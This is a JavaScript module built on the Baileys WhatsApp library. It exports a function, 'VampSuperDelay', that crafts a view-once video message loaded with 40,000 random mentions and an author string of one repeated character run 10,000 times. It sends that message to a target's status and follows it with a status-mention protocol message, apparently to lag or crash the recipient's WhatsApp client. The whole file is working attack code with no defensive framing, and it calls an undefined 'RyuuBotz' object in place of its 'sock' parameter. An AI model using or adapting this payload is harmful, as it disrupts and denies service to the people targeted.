const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

async function VampSuperDelay(sock, jid, mention = true) {

  const mentionedList = [

    "13135550002@s.whatsapp.net",

    ...Array.from(

      { length: 40000 },

      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`

    ),

  ];

  const embeddedMusic = {

    musicContentMediaId: "589608164114571",

    songId: "870166291800508",

    author: "YALAH" + "ោ៝".repeat(10000),

    title: "XATA",

    artworkDirectPath:

      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",

    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",

    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",

    artistAttribution: "https://www.youtube.com/@xatanicvxii",

    countryBlocklist: true,

    isExplicit: true,

    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",

  };

  const videoMessage = {

    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",

    mimetype: "video/mp4",

    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",

    fileLength: "289511",

    seconds: 15,

    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",

    caption: "KAMU GAPAPAKAN SAYANG",

    height: 640,

    width: 640,

    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",

    directPath:

      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",

    mediaKeyTimestamp: "1743848703",

    contextInfo: {

      isSampled: true,

      mentionedJid: mentionedList,

    },

    forwardedNewsletterMessageInfo: {

      newsletterJid: "120363321780343299@newsletter",

      serverMessageId: 1,

      newsletterName: "VampClouds",

    },

    streamingSidecar:

      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",

    thumbnailDirectPath:

      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",

    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",

    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",

    annotations: [

      {

        embeddedContent: {

          embeddedMusic,

        },

        embeddedAction: true,

      },

    ],

  };

  const msg = generateWAMessageFromContent(

    jid,

    {

      viewOnceMessage: {

        message: { videoMessage },

      },

    },

    {}

  );

  await RyuuBotz.sendMessage("status@broadcast", msg.message, {

    messageId: msg.key.id,

    statusJidList: [jid],

    additionalNodes: [

      {

        tag: "meta",

        attrs: {},

        content: [

          {

            tag: "mentioned_users",

            attrs: {},

            content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],

          },

        ],

      },

    ],

  });

  if (mention) {

    await RyuuBotz.sendMessage(

      jid,

      {

        statusMentionMessage: {

          message: {

            protocolMessage: {

              key: msg.key,

              type: 25,

            },

          },

        },

      },

      {

        additionalNodes: [

          {

            tag: "meta",

            attrs: { is_status_mention: "true" },

            content: undefined,

          },

        ],

      }

    );

  }

}

module.exports = VampSuperDelay;